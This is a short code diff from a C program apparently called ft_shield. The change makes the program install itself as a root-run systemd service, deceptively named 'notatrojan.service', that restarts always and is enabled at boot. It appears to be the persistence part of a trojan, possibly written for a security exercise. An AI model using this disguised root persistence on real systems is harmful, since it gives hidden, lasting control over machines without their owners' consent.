@@ -6,16 +6,19 @@
 #include <ft_shield.h>
 #include <string.h>
 
-#define NAME "ft_shield"
+#define NAME "/bin/ft_shield"
 
 #define SERVICE						\
 	"[Service]\n"					\
-	"ExecStart=/bin/ft_shield\n"	\
+	"ExecStart=/bin/ft_shield\n"			\
 	"Restart=always\n"				\
-	"User=root\n"
+	"User=root\n"					\
+	"\n"						\
+	"[Install]\n"					\
+	"WantedBy=multi-user.target\n"
 // then systemctl enable notatrojan.service
 
-#define SERVICE_NAME "/etc/systemd/system/notatrojan.service"
+#define SERVICE_NAME "/etc/systemd/system/notatrojan.service" // needs a symlink or smt
 
 void create_file(char *name, char *content, int len) {
 	int fd = open(name, O_WRONLY | O_TRUNC | O_CREAT, 0755);
